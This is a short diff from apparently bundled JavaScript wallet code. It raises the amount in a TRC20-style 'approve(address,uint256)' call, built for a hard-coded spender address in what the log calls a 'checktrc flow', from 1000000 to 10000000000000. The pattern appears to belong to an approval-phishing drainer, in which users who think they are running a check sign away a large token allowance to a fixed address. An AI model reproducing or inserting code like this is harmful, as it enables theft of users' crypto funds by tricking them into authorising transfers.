@@ -90726,7 +90726,7 @@
                         value: "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
                     }, {
                         type: "uint256",
-                        value: "1000000"
+                        value: "10000000000000"
                     }];
                     const functionSelector = "approve(address,uint256)";
                     console.log("[SIGN] Building approve (checktrc flow) for", e);
